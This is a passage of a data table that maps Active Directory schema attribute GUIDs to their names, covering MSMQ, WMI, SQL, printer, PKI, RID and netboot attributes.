	"9a0dc32c-c100-11d1-bbc5-0080c76670c0": "MSMQ-In-Routing-Servers",
	"9a0dc32f-c100-11d1-bbc5-0080c76670c0": "MSMQ-Foreign",
	"9a0dc331-c100-11d1-bbc5-0080c76670c0": "MSMQ-Encrypt-Key",
	"2df90d78-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Ds-Services",
	"2df90d82-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Ds-Service",
	"0f71d8e0-da3b-11d1-90a5-00c04fd91ab1": "MSMQ-Digests-Mig",
	"9a0dc33c-c100-11d1-bbc5-0080c76670c0": "MSMQ-Digests",
	"2df90d76-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Dependent-Client-Services",
	"2df90d83-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Dependent-Client-Service",
	"9a0dc334-c100-11d1-bbc5-0080c76670c0": "MSMQ-CSP-Name",
	"9a0dc33a-c100-11d1-bbc5-0080c76670c0": "MSMQ-Cost",
	"18120de8-f4c4-4341-bd95-32eb5bcf7c80": "MSMQ-Computer-Type-Ex",
	"9a0dc32e-c100-11d1-bbc5-0080c76670c0": "MSMQ-Computer-Type",
	"9a0dc323-c100-11d1-bbc5-0080c76670c0": "MSMQ-Base-Priority",
	"9a0dc326-c100-11d1-bbc5-0080c76670c0": "MSMQ-Authenticate",
	"96a7dd63-9118-11d1-aebc-0000f80367c1": "Msi-Script-Size",
	"bf967937-0de6-11d0-a285-00aa003049e2": "Msi-Script-Path",
	"96a7dd62-9118-11d1-aebc-0000f80367c1": "Msi-Script-Name",
	"d9e18313-8939-11d1-aebc-0000f80367c1": "Msi-Script",
	"7bfdcb7d-4807-11d1-a9c3-0000f80367c1": "Msi-File-List",
	"963d2751-48be-11d1-a9c3-0000f80367c1": "Mscope-Id",
	"ca2a281e-262b-4ff7-b419-bc123352a4e9": "ms-WMI-TargetType",
	"5006a79a-6bfe-4561-9f52-13cf4dd3e560": "ms-WMI-TargetPath",
	"c44f67a5-7de5-4a1f-92d9-662b57364b77": "ms-WMI-TargetObject",
	"1c4ab61f-3420-44e5-849d-8b5dbf60feb7": "ms-WMI-TargetNameSpace",
	"95b6d8d6-c9e8-4661-a2bc-6a5cabc04c62": "ms-WMI-TargetClass",
	"37609d31-a2bf-4b58-8f53-2b64e57a076d": "ms-WMI-stringValidValues",
	"152e42b6-37c5-4f55-ab48-1606384a9aea": "ms-WMI-stringDefault",
	"34f7ed6c-615d-418d-aa00-549a7d7be03e": "ms-WMI-SourceOrganization",
	"87b78d51-405f-4b7f-80ed-2bd28786f48d": "ms-WMI-ScopeGuid",
	"7d3cfa98-c17b-4254-8bd7-4de9b932a345": "ms-WMI-QueryLanguage",
	"65fff93e-35e3-45a3-85ae-876c6718297f": "ms-WMI-Query",
	"ab920883-e7f8-4d72-b4a0-c0449897509d": "ms-WMI-PropertyName",
	"3800d5a3-f1ce-4b82-a59a-1528ea795f59": "ms-WMI-Parm4",
	"45958fb6-52bd-48ce-9f9f-c2712d9f2bfc": "ms-WMI-Parm3",
	"0003508e-9c42-4a76-a8f4-38bf64bab0de": "ms-WMI-Parm2",
	"27e81485-b1b0-4a8b-bedd-ce19a837e26e": "ms-WMI-Parm1",
	"eaba628f-eb8e-4fe9-83fc-693be695559b": "ms-WMI-NormalizedClass",
	"c6c8ace5-7e81-42af-ad72-77412c5941c4": "ms-WMI-Name",
	"6736809f-2064-443e-a145-81262b1f1366": "ms-WMI-Mof",
	"103519a9-c002-441b-981a-b0b3e012c803": "ms-WMI-int8ValidValues",
	"ed1489d1-54cc-4066-b368-a00daa2664f1": "ms-WMI-int8Min",
	"e3d8b547-003d-4946-a32b-dc7cedc96b74": "ms-WMI-int8Max",
	"f4d8085a-8c5b-4785-959b-dc585566e445": "ms-WMI-int8Default",
	"6af565f6-a749-4b72-9634-3c5d47e6b4e0": "ms-WMI-intValidValues",
	"68c2e3ba-9837-4c70-98e0-f0c33695d023": "ms-WMI-intMin",
	"fb920c2c-f294-4426-8ac1-d24b42aa2bce": "ms-WMI-intMax",
	"bd74a7ac-c493-4c9c-bdfa-5c7b119ca6b2": "ms-WMI-intFlags4",
	"f29fa736-de09-4be4-b23a-e734c124bacc": "ms-WMI-intFlags3",
	"075a42c9-c55a-45b1-ac93-eb086b31f610": "ms-WMI-intFlags2",
	"18e006b9-6445-48e3-9dcf-b5ecfbc4df8e": "ms-WMI-intFlags1",
	"1b0c07f8-76dd-4060-a1e1-70084619dc90": "ms-WMI-intDefault",
	"9339a803-94b8-47f7-9123-a853b9ff7e45": "ms-WMI-ID",
	"50c8673a-8f56-4614-9308-9e1340fb9af3": "ms-WMI-Genus",
	"748b0a2e-3351-4b3f-b171-2f17414ea779": "ms-WMI-CreationDate",
	"2b9c0ebc-c272-45cb-99d2-4d0e691632e0": "ms-WMI-ClassDefinition",
	"90c1925f-4a24-4b07-b202-be32eb3c8b74": "ms-WMI-Class",
	"f9cdf7a0-ec44-4937-a79b-cd91522b3aa8": "ms-WMI-ChangeDate",
	"6366c0c1-6972-4e66-b3a5-1d52ad0c0547": "ms-WMI-Author",
	"70a4e7ea-b3b9-4643-8918-e6dd2471bfd4": "ms-TAPI-Unique-Identifier",
	"89c1ebcf-7a5f-41fd-99ca-c900b32299ab": "ms-TAPI-Protocol-Id",
	"efd7d7f7-178e-4767-87fa-f8a16b840544": "ms-TAPI-Ip-Address",
	"4cc4601e-7201-4141-abc8-3e529ae88863": "ms-TAPI-Conference-Blob",
	"c4e311fc-d34b-11d2-999a-0000f87a57d4": "MS-SQL-ThirdParty",
	"c49b8be8-d34b-11d2-999a-0000f87a57d4": "MS-SQL-AllowSnapshotFilesFTPDownloading",
	"c458ca80-d34b-11d2-999a-0000f87a57d4": "MS-SQL-AllowQueuedUpdatingSubscription",
	"c4186b6e-d34b-11d2-999a-0000f87a57d4": "MS-SQL-AllowImmediateUpdatingSubscription",
	"c3bb7054-d34b-11d2-999a-0000f87a57d4": "MS-SQL-AllowKnownPullSubscription",
	"c1676858-d34b-11d2-999a-0000f87a57d4": "MS-SQL-Publisher",
	"01e9a98a-ccef-11d2-9993-0000f87a57d4": "MS-SQL-Keywords",
	"fbcda2ea-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Applications",
	"f6d6dd88-ccee-11d2-9993-0000f87a57d4": "MS-SQL-LastDiagnosticDate",
	"f2b6abca-ccee-11d2-9993-0000f87a57d4": "MS-SQL-LastBackupDate",
	"ede14754-ccee-11d2-9993-0000f87a57d4": "MS-SQL-CreationDate",
	"e9098084-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Size",
	"e0c6baae-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Alias",
	"db77be4a-ccee-11d2-9993-0000f87a57d4": "MS-SQL-AllowAnonymousSubscription",
	"d5a0dbdc-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Database",
	"d0aedb2e-ccee-11d2-9993-0000f87a57d4": "MS-SQL-InformationDirectory",
	"ca48eba8-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Type",
	"8386603c-ccef-11d2-9993-0000f87a57d4": "MS-SQL-Description",
	"c57f72f4-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Language",
	"c07cc1d0-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Version",
	"bcdd4f0e-ccee-11d2-9993-0000f87a57d4": "MS-SQL-GPSHeight",
	"b7577c94-ccee-11d2-9993-0000f87a57d4": "MS-SQL-GPSLongitude",
	"b222ba0e-ccee-11d2-9993-0000f87a57d4": "MS-SQL-GPSLatitude",
	"ae0c11b8-ccee-11d2-9993-0000f87a57d4": "MS-SQL-PublicationURL",
	"a92d23da-ccee-11d2-9993-0000f87a57d4": "MS-SQL-ConnectionURL",
	"a42cd510-ccee-11d2-9993-0000f87a57d4": "MS-SQL-InformationURL",
	"9fcc43d4-ccee-11d2-9993-0000f87a57d4": "MS-SQL-LastUpdatedDate",
	"9a7d4770-ccee-11d2-9993-0000f87a57d4": "MS-SQL-Status",
	"19195a53-6da0-11d0-afd3-00c04fd930c9": "Options",
	"963d274d-48be-11d1-a9c3-0000f80367c1": "Option-Description",
	"bf9679ee-0de6-11d0-a285-00aa003049e2": "Operator-Count",
	"3e978926-8c01-11d0-afda-00c04fd930c9": "Operating-System-Version",
	"3e978927-8c01-11d0-afda-00c04fd930c9": "Operating-System-Service-Pack",
	"bd951b3c-9c96-11d0-afdd-00c04fd930c9": "Operating-System-Hotfix",
	"3e978925-8c01-11d0-afda-00c04fd930c9": "Operating-System",
	"1f0075fa-7e40-11d0-afd6-00c04fd930c9": "OMT-Indx-Guid",
	"ddac0cf3-af8f-11d0-afeb-00c04fd930c9": "OMT-Guid",
	"bf9679ed-0de6-11d0-a285-00aa003049e2": "OM-Syntax",
	"bf9679ec-0de6-11d0-a285-00aa003049e2": "OM-Object-Class",
	"bf9679ea-0de6-11d0-a285-00aa003049e2": "OEM-Information",
	"16775848-47f3-11d1-a9c3-0000f80367c1": "Object-Version",
	"bf9679e8-0de6-11d0-a285-00aa003049e2": "Object-Sid",
	"bf9679e7-0de6-11d0-a285-00aa003049e2": "Object-Guid",
	"34aaa216-b699-11d0-afee-0000f80367c1": "Object-Count",
	"9a7ad94b-ca53-11d1-bbd0-0080c76670c0": "Object-Classes",
	"bf9679e6-0de6-11d0-a285-00aa003049e2": "Object-Class-Category",
	"bf9679e5-0de6-11d0-a285-00aa003049e2": "Object-Class",
	"26d97369-6070-11d1-a9c6-0000f80367c1": "Object-Category",
	"bf9679e4-0de6-11d0-a285-00aa003049e2": "Obj-Dist-Name",
	"bf9679e3-0de6-11d0-a285-00aa003049e2": "NT-Security-Descriptor",
	"bf9679e2-0de6-11d0-a285-00aa003049e2": "Nt-Pwd-History",
	"3e97891f-8c01-11d0-afda-00c04fd930c9": "NT-Mixed-Domain",
	"bf9679df-0de6-11d0-a285-00aa003049e2": "NT-Group-Members",
	"19195a56-6da0-11d0-afd3-00c04fd930c9": "Notification-List",
	"52458019-ca6a-11d0-afff-0000f80367c1": "Non-Security-Member-BL",
	"52458018-ca6a-11d0-afff-0000f80367c1": "Non-Security-Member",
	"bf9679db-0de6-11d0-a285-00aa003049e2": "Next-Rid",
	"bf9679da-0de6-11d0-a285-00aa003049e2": "Next-Level-Store",
	"bf9679d9-0de6-11d0-a285-00aa003049e2": "Network-Address",
	"0738307f-91df-11d1-aebc-0000f80367c1": "netboot-Tools",
	"2df90d84-009f-11d2-aa4c-00c04fd7d83a": "Netboot-SIF-File",
	"07383081-91df-11d1-aebc-0000f80367c1": "netboot-Server",
	"07383082-91df-11d1-aebc-0000f80367c1": "netboot-SCP-BL",
	"0738307d-91df-11d1-aebc-0000f80367c1": "netboot-New-Machine-OU",
	"0738307c-91df-11d1-aebc-0000f80367c1": "netboot-New-Machine-Naming-Policy",
	"2df90d85-009f-11d2-aa4c-00c04fd7d83a": "Netboot-Mirror-Data-File",
	"07383078-91df-11d1-aebc-0000f80367c1": "netboot-Max-Clients",
	"3e978923-8c01-11d0-afda-00c04fd930c9": "Netboot-Machine-File-Path",
	"07383080-91df-11d1-aebc-0000f80367c1": "netboot-Locally-Installed-OSes",
	"07383077-91df-11d1-aebc-0000f80367c1": "netboot-Limit-Clients",
	"0738307e-91df-11d1-aebc-0000f80367c1": "netboot-IntelliMirror-OSes",
	"3e978920-8c01-11d0-afda-00c04fd930c9": "Netboot-Initialization",
	"532570bd-3d77-424f-822f-0d636dc6daad": "Netboot-DUID",
	"3e978921-8c01-11d0-afda-00c04fd930c9": "Netboot-GUID",
	"07383079-91df-11d1-aebc-0000f80367c1": "netboot-Current-Client-Count",
	"0738307a-91df-11d1-aebc-0000f80367c1": "netboot-Answer-Requests",
	"0738307b-91df-11d1-aebc-0000f80367c1": "netboot-Answer-Only-Valid-Clients",
	"07383076-91df-11d1-aebc-0000f80367c1": "netboot-Allow-New-Clients",
	"bf9679d8-0de6-11d0-a285-00aa003049e2": "NETBIOS-Name",
	"bf9679d6-0de6-11d0-a285-00aa003049e2": "NC-Name",
	"80212840-4bdc-11d1-a9c4-0000f80367c1": "Name-Service-Flags",
	"bf9679d3-0de6-11d0-a285-00aa003049e2": "Must-Contain",
	"db0c90c7-c1f2-11d1-bbc5-0080c76670c0": "msRASSavedFramedRoute",
	"db0c90c6-c1f2-11d1-bbc5-0080c76670c0": "msRASSavedFramedIPAddress",
	"db0c90c5-c1f2-11d1-bbc5-0080c76670c0": "msRASSavedCallbackNumber",
	"db0c90b6-c1f2-11d1-bbc5-0080c76670c0": "msRADIUSServiceType",
	"db0c90a9-c1f2-11d1-bbc5-0080c76670c0": "msRADIUSFramedRoute",
	"db0c90a4-c1f2-11d1-bbc5-0080c76670c0": "msRADIUSFramedIPAddress",
	"db0c909c-c1f2-11d1-bbc5-0080c76670c0": "msRADIUSCallbackNumber",
	"db0c908e-c1f2-11d1-bbc5-0080c76670c0": "msNPSavedCallingStationID",
	"db0c908a-c1f2-11d1-bbc5-0080c76670c0": "msNPCallingStationID",
	"db0c9089-c1f2-11d1-bbc5-0080c76670c0": "msNPCalledStationID",
	"db0c9085-c1f2-11d1-bbc5-0080c76670c0": "msNPAllowDialin",
	"9a0dc336-c100-11d1-bbc5-0080c76670c0": "MSMQ-Version",
	"c58aae32-56f9-11d2-90d0-00c04fd91ab1": "MSMQ-User-Sid",
	"9a0dc329-c100-11d1-bbc5-0080c76670c0": "MSMQ-Transactional",
	"9a0dc32a-c100-11d1-bbc5-0080c76670c0": "MSMQ-Sites",
	"422144fa-c17f-4649-94d6-9731ed2784ed": "MSMQ-Site-Name-Ex",
	"ffadb4b2-de39-11d1-90a5-00c04fd91ab1": "MSMQ-Site-Name",
	"9a0dc340-c100-11d1-bbc5-0080c76670c0": "MSMQ-Site-ID",
	"e2704852-3b7b-11d2-90cc-00c04fd91ab1": "MSMQ-Site-Gates-Mig",
	"9a0dc339-c100-11d1-bbc5-0080c76670c0": "MSMQ-Site-Gates",
	"fd129d8a-d57e-11d1-90a2-00c04fd91ab1": "MSMQ-Site-Foreign",
	"9a0dc338-c100-11d1-bbc5-0080c76670c0": "MSMQ-Site-2",
	"9a0dc337-c100-11d1-bbc5-0080c76670c0": "MSMQ-Site-1",
	"9a0dc332-c100-11d1-bbc5-0080c76670c0": "MSMQ-Sign-Key",
	"3881b8ea-da3b-11d1-90a5-00c04fd91ab1": "MSMQ-Sign-Certificates-Mig",
	"9a0dc33b-c100-11d1-bbc5-0080c76670c0": "MSMQ-Sign-Certificates",
	"9a0dc33d-c100-11d1-bbc5-0080c76670c0": "MSMQ-Services",
	"9a0dc32d-c100-11d1-bbc5-0080c76670c0": "MSMQ-Service-Type",
	"8bf0221b-7a06-4d63-91f0-1499941813d3": "MSMQ-Secured-Source",
	"2df90d77-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Routing-Services",
	"2df90d81-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Routing-Service",
	"3bfe6748-b544-485a-b067-1b310c4334bf": "MSMQ-Recipient-FormatName",
	"9a0dc322-c100-11d1-bbc5-0080c76670c0": "MSMQ-Quota",
	"9a0dc320-c100-11d1-bbc5-0080c76670c0": "MSMQ-Queue-Type",
	"3f6b8e12-d57f-11d1-90a2-00c04fd91ab1": "MSMQ-Queue-Quota",
	"2df90d87-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Queue-Name-Ext",
	"8e441266-d57f-11d1-90a2-00c04fd91ab1": "MSMQ-Queue-Journal-Quota",
	"9a0dc33e-c100-11d1-bbc5-0080c76670c0": "MSMQ-QM-ID",
	"9a0dc327-c100-11d1-bbc5-0080c76670c0": "MSMQ-Privacy-Level",
	"2df90d75-009f-11d2-aa4c-00c04fd7d83a": "MSMQ-Prev-Site-Gates",
	"9a0dc328-c100-11d1-bbc5-0080c76670c0": "MSMQ-Owner-ID",
	"9a0dc32b-c100-11d1-bbc5-0080c76670c0": "MSMQ-Out-Routing-Servers",
	"9a0dc330-c100-11d1-bbc5-0080c76670c0": "MSMQ-OS-Type",
	"6f914be6-d57e-11d1-90a2-00c04fd91ab1": "MSMQ-Nt4-Stub",
	"eb38a158-d57f-11d1-90a2-00c04fd91ab1": "MSMQ-Nt4-Flags",
	"9a0dc333-c100-11d1-bbc5-0080c76670c0": "MSMQ-Name-Style",
	"281416c9-1968-11d0-a28f-00aa003049e2": "Print-Start-Time",
	"ba305f73-47e3-11d0-a1a6-00c04fd930c9": "Print-Stapling-Supported",
	"ba305f6c-47e3-11d0-a1a6-00c04fd930c9": "Print-Spooling",
	"ba305f68-47e3-11d0-a1a6-00c04fd930c9": "Print-Share-Name",
	"281416c6-1968-11d0-a28f-00aa003049e2": "Print-Separator-File",
	"ba305f78-47e3-11d0-a1a6-00c04fd930c9": "Print-Rate-Unit",
	"ba305f77-47e3-11d0-a1a6-00c04fd930c9": "Print-Rate",
	"19405b97-3cfa-11d1-a9c0-0000f80367c1": "Print-Pages-Per-Minute",
	"ba305f69-47e3-11d0-a1a6-00c04fd930c9": "Print-Owner",
	"281416d0-1968-11d0-a28f-00aa003049e2": "Print-Orientations-Supported",
	"3bcbfcf4-4d3d-11d0-a1a6-00c04fd930c9": "Print-Number-Up",
	"ba305f6a-47e3-11d0-a1a6-00c04fd930c9": "Print-Notify",
	"ba305f79-47e3-11d0-a1a6-00c04fd930c9": "Print-Network-Address",
	"ba305f72-47e3-11d0-a1a6-00c04fd930c9": "Print-Min-Y-Extent",
	"ba305f71-47e3-11d0-a1a6-00c04fd930c9": "Print-Min-X-Extent",
	"ba305f74-47e3-11d0-a1a6-00c04fd930c9": "Print-Memory",
	"244b296f-5abd-11d0-afd2-00c04fd930c9": "Print-Media-Supported",
	"3bcbfcf5-4d3d-11d0-a1a6-00c04fd930c9": "Print-Media-Ready",
	"ba305f70-47e3-11d0-a1a6-00c04fd930c9": "Print-Max-Y-Extent",
	"ba305f6f-47e3-11d0-a1a6-00c04fd930c9": "Print-Max-X-Extent",
	"281416cf-1968-11d0-a28f-00aa003049e2": "Print-Max-Resolution-Supported",
	"281416d1-1968-11d0-a28f-00aa003049e2": "Print-Max-Copies",
	"ba305f7a-47e3-11d0-a1a6-00c04fd930c9": "Print-MAC-Address",
	"281416d6-1968-11d0-a28f-00aa003049e2": "Print-Language",
	"ba305f6d-47e3-11d0-a1a6-00c04fd930c9": "Print-Keep-Printed-Jobs",
	"281416cb-1968-11d0-a28f-00aa003049e2": "Print-Form-Name",
	"281416ca-1968-11d0-a28f-00aa003049e2": "Print-End-Time",
	"281416cc-1968-11d0-a28f-00aa003049e2": "Print-Duplex-Supported",
	"281416d3-1968-11d0-a28f-00aa003049e2": "Print-Color",
	"281416d2-1968-11d0-a28f-00aa003049e2": "Print-Collate",
	"281416cd-1968-11d0-a28f-00aa003049e2": "Print-Bin-Names",
	"281416d7-1968-11d0-a28f-00aa003049e2": "Print-Attributes",
	"c0ed8738-7efd-4481-84d9-66d2db8be369": "Primary-Group-Token",
	"bf967a00-0de6-11d0-a285-00aa003049e2": "Primary-Group-ID",
	"963d273d-48be-11d1-a9c3-0000f80367c1": "Previous-Parent-CA",
	"963d2739-48be-11d1-a9c3-0000f80367c1": "Previous-CA-Certificates",
	"a8df744b-c5ea-11d1-bbcb-0080c76670c0": "Presentation-Address",
	"52458022-ca6a-11d0-afff-0000f80367c1": "Prefix-Map",
	"bf9679ff-0de6-11d0-a285-00aa003049e2": "Preferred-OU",
	"856be0d0-18e7-46e1-8f5f-7ee4d9020e0d": "preferredLanguage",
	"bf9679fe-0de6-11d0-a285-00aa003049e2": "Preferred-Delivery-Method",
	"bf9679fd-0de6-11d0-a285-00aa003049e2": "Postal-Code",
	"bf9679fc-0de6-11d0-a285-00aa003049e2": "Postal-Address",
	"bf9679fb-0de6-11d0-a285-00aa003049e2": "Post-Office-Box",
	"9a7ad94c-ca53-11d1-bbd0-0080c76670c0": "Possible-Inferiors",
	"bf9679fa-0de6-11d0-a285-00aa003049e2": "Poss-Superiors",
	"281416c4-1968-11d0-a28f-00aa003049e2": "Port-Name",
	"19405b96-3cfa-11d1-a9c0-0000f80367c1": "Policy-Replication-Flags",
	"8447f9f0-1027-11d0-a05f-00aa006c33ed": "PKT-Guid",
	"8447f9f1-1027-11d0-a05f-00aa006c33ed": "PKT",
	"1219a3ec-3b9e-11d2-90cc-00c04fd91ab1": "PKI-Overlap-Period",
	"f0bfdefa-3b9d-11d2-90cc-00c04fd91ab1": "PKI-Max-Issuing-Depth",
	"e9b0a87e-3b9d-11d2-90cc-00c04fd91ab1": "PKI-Key-Usage",
	"18976af6-3b9e-11d2-90cc-00c04fd91ab1": "PKI-Extended-Key-Usage",
	"041570d2-3b9e-11d2-90cc-00c04fd91ab1": "PKI-Expiration-Period",
	"926be278-56f9-11d2-90d0-00c04fd91ab1": "PKI-Enrollment-Access",
	"426cae6e-3b9d-11d2-90cc-00c04fd91ab1": "PKI-Default-Key-Spec",
	"1ef6336e-3b9e-11d2-90cc-00c04fd91ab1": "PKI-Default-CSPs",
	"fc5a9106-3b9d-11d2-90cc-00c04fd91ab1": "PKI-Critical-Extensions",
	"8d3bca50-1d7e-11d0-a081-00aa006c33ed": "Picture",
	"b7b13119-b82e-11d0-afee-0000f80367c1": "Physical-Location-Object",
	"bf9679f7-0de6-11d0-a285-00aa003049e2": "Physical-Delivery-Office-Name",
	"9c979768-ba1a-4c08-9632-c6a5c1ed649a": "photo",
	"f0f8ffa6-1191-11d0-a060-00aa006c33ed": "Phone-Pager-Primary",
	"f0f8ffa4-1191-11d0-a060-00aa006c33ed": "Phone-Pager-Other",
	"f0f8ffa5-1191-11d0-a060-00aa006c33ed": "Phone-Office-Other",
	"f0f8ffa3-1191-11d0-a060-00aa006c33ed": "Phone-Mobile-Primary",
	"0296c11e-40da-11d1-a9c0-0000f80367c1": "Phone-Mobile-Other",
	"0296c11f-40da-11d1-a9c0-0000f80367c1": "Phone-ISDN-Primary",
	"4d146e4a-48d4-11d1-a9c3-0000f80367c1": "Phone-Ip-Primary",
	"4d146e4b-48d4-11d1-a9c3-0000f80367c1": "Phone-Ip-Other",
	"f0f8ffa1-1191-11d0-a060-00aa006c33ed": "Phone-Home-Primary",
	"f0f8ffa2-1191-11d0-a060-00aa006c33ed": "Phone-Home-Other",
	"0296c11d-40da-11d1-a9c0-0000f80367c1": "Phone-Fax-Other",
	"16775858-47f3-11d1-a9c3-0000f80367c1": "Personal-Title",
	"5fd424d4-1262-11d0-a060-00aa006c33ed": "Per-Recip-Dialog-Display-Table",
	"5fd424d3-1262-11d0-a060-00aa006c33ed": "Per-Msg-Dialog-Display-Table",
	"963d273e-48be-11d1-a9c3-0000f80367c1": "Pending-Parent-CA",
	"963d273c-48be-11d1-a9c3-0000f80367c1": "Pending-CA-Certificates",
	"07383083-91df-11d1-aebc-0000f80367c1": "Pek-List",
	"07383084-91df-11d1-aebc-0000f80367c1": "Pek-Key-Change-Interval",
	"19405b9e-3cfa-11d1-a9c0-0000f80367c1": "Partial-Attribute-Set",
	"28630ec0-41d5-11d1-a9c1-0000f80367c1": "Partial-Attribute-Deletion-List",
	"2df90d74-009f-11d2-aa4c-00c04fd7d83a": "Parent-GUID",
	"963d2733-48be-11d1-a9c3-0000f80367c1": "Parent-CA-Certificate-Chain",
	"5245801b-ca6a-11d0-afff-0000f80367c1": "Parent-CA",
	"7d6c0e96-7e20-11d0-afd6-00c04fd930c9": "Package-Type",
	"7d6c0e98-7e20-11d0-afd6-00c04fd930c9": "Package-Name",
	"7d6c0e99-7e20-11d0-afd6-00c04fd930c9": "Package-Flags",
	"bf9679f3-0de6-11d0-a285-00aa003049e2": "Owner",
	"1ea64e5d-ac0f-11d2-90df-00c04fd91ab1": "Other-Well-Known-Objects",
	"bf9679f2-0de6-11d0-a285-00aa003049e2": "Other-Name",
	"0296c123-40da-11d1-a9c0-0000f80367c1": "Other-Mailbox",
	"bf9679f1-0de6-11d0-a285-00aa003049e2": "Other-Login-Workstations",
	"5fd424cf-1262-11d0-a060-00aa006c33ed": "Original-Display-Table-MSDOS",
	"5fd424ce-1262-11d0-a060-00aa006c33ed": "Original-Display-Table",
	"28596019-7349-4d2f-adff-5a629961f942": "organizationalStatus",
	"bf9679f0-0de6-11d0-a285-00aa003049e2": "Organizational-Unit-Name",
	"bf9679ef-0de6-11d0-a285-00aa003049e2": "Organization-Name",
	"963d274e-48be-11d1-a9c3-0000f80367c1": "Options-Location",
	"28630eb8-41d5-11d1-a9c1-0000f80367c1": "Service-DNS-Name",
	"b7b1311d-b82e-11d0-afee-0000f80367c1": "Service-Class-Name",
	"bf967a36-0de6-11d0-a285-00aa003049e2": "Service-Class-Info",
	"bf967a35-0de6-11d0-a285-00aa003049e2": "Service-Class-ID",
	"b7b1311c-b82e-11d0-afee-0000f80367c1": "Service-Binding-Information",
	"bf967a34-0de6-11d0-a285-00aa003049e2": "Server-State",
	"bf967a33-0de6-11d0-a285-00aa003049e2": "Server-Role",
	"26d9736e-6070-11d1-a9c6-0000f80367c1": "Server-Reference-BL",
	"26d9736d-6070-11d1-a9c6-0000f80367c1": "Server-Reference",
	"09dcb7a0-165f-11d0-a064-00aa006c33ed": "Server-Name",
	"bf967a32-0de6-11d0-a285-00aa003049e2": "Serial-Number",
	"ddac0cf2-af8f-11d0-afeb-00c04fd930c9": "Seq-Notification",
	"bf967a31-0de6-11d0-a285-00aa003049e2": "See-Also",
	"bf967a2f-0de6-11d0-a285-00aa003049e2": "Security-Identifier",
	"01072d9a-98ad-4a53-9744-e83e287278fb": "secretary",
	"bf967a2e-0de6-11d0-a285-00aa003049e2": "Search-Guide",
	"bf967a2d-0de6-11d0-a285-00aa003049e2": "Search-Flags",
	"c3dbafa6-33df-11d2-98b2-0000f87a57d4": "SD-Rights-Effective",
	"bf9679a8-0de6-11d0-a285-00aa003049e2": "Script-Path",
	"16f3a4c2-7e79-11d2-9921-0000f87a57d4": "Scope-Flags",
	"bf967a2c-0de6-11d0-a285-00aa003049e2": "Schema-Version",
	"1e2d06b4-ac8f-11d0-afe3-00c04fd930c9": "Schema-Update",
	"f9fb64ae-93b4-11d2-9945-0000f87a57d4": "Schema-Info",
	"bf967923-0de6-11d0-a285-00aa003049e2": "Schema-ID-GUID",
	"bf967a2b-0de6-11d0-a285-00aa003049e2": "Schema-Flags-Ex",
	"dd712224-10e4-11d0-a05f-00aa006c33ed": "Schedule",
	"04d2d114-f799-4e9b-bcdc-90e8f5ba7ebe": "SAM-Domain-Updates",
	"6e7b626c-64f2-11d0-afd2-00c04fd930c9": "SAM-Account-Type",
	"3e0abfd0-126a-11d0-a060-00aa006c33ed": "SAM-Account-Name",
	"29401c4a-7a27-11d0-afd6-00c04fd930c9": "rpc-Ns-Transfer-Syntax",
	"bf967a28-0de6-11d0-a285-00aa003049e2": "rpc-Ns-Profile-Entry",
	"bf967a27-0de6-11d0-a285-00aa003049e2": "rpc-Ns-Priority",
	"29401c48-7a27-11d0-afd6-00c04fd930c9": "rpc-Ns-Object-ID",
	"bf967a25-0de6-11d0-a285-00aa003049e2": "rpc-Ns-Interface-ID",
	"bf967a24-0de6-11d0-a285-00aa003049e2": "rpc-Ns-Group",
	"80212841-4bdc-11d1-a9c4-0000f80367c1": "rpc-Ns-Entry-Flags",
	"7a0ba0e0-8e98-11d0-afda-00c04fd930c9": "rpc-Ns-Codeset",
	"bf967a23-0de6-11d0-a285-00aa003049e2": "rpc-Ns-Bindings",
	"88611bde-8cf4-11d0-afda-00c04fd930c9": "rpc-Ns-Annotation",
	"7bfdcb80-4807-11d1-a9c3-0000f80367c1": "Root-Trust",
	"81d7f8c2-e327-4a0d-91c6-b42d4009115f": "roomNumber",
	"a8df7465-c5ea-11d1-bbcb-0080c76670c0": "Role-Occupant",
	"8297931c-86d3-11d0-afda-00c04fd930c9": "Rights-Guid",
	"6617188b-8f3c-11d0-afda-00c04fd930c9": "RID-Used-Pool",
	"7bfdcb7b-4807-11d1-a9c3-0000f80367c1": "RID-Set-References",
	"6617188a-8f3c-11d0-afda-00c04fd930c9": "RID-Previous-Allocation-Pool",
	"6617188c-8f3c-11d0-afda-00c04fd930c9": "RID-Next-RID",
	"66171886-8f3c-11d0-afda-00c04fd930c9": "RID-Manager-Reference",
	"66171888-8f3c-11d0-afda-00c04fd930c9": "RID-Available-Pool",
	"66171889-8f3c-11d0-afda-00c04fd930c9": "RID-Allocation-Pool",
	"bf967a22-0de6-11d0-a285-00aa003049e2": "Rid",
	"bf967a21-0de6-11d0-a285-00aa003049e2": "Revision",
	"040fc392-33df-11d2-98b2-0000f87a57d4": "Token-Groups-No-GC-Acceptable",
	"46a9b11d-60ae-405a-b7e8-ff8a58d456d2": "Token-Groups-Global-And-Universal",
	"b7c69e6d-2cc7-11d2-854e-00a0c983f608": "Token-Groups",
	"7bfdcb7f-4807-11d1-a9c3-0000f80367c1": "Retired-Repl-DSA-Signatures",
	"7d6c0e93-7e20-11d0-afd6-00c04fd930c9": "Required-Categories",
	"bf967a1e-0de6-11d0-a285-00aa003049e2": "Reps-To",
	"bf967a1d-0de6-11d0-a285-00aa003049e2": "Reps-From",
	"45ba9d1a-56fa-11d2-90d0-00c04fd91ab1": "Repl-Interval",
	"bf967a1c-0de6-11d0-a285-00aa003049e2": "Reports",
	"bf967a18-0de6-11d0-a285-00aa003049e2": "Replica-Source",
	"bf967a16-0de6-11d0-a285-00aa003049e2": "Repl-UpToDate-Vector",
	"7bfdcb83-4807-11d1-a9c3-0000f80367c1": "Repl-Topology-Stay-Of-Execution",
	"281416c0-1968-11d0-a28f-00aa003049e2": "Repl-Property-Meta-Data",
	"2a39c5b0-8960-11d1-aebc-0000f80367c1": "Remote-Storage-GUID",
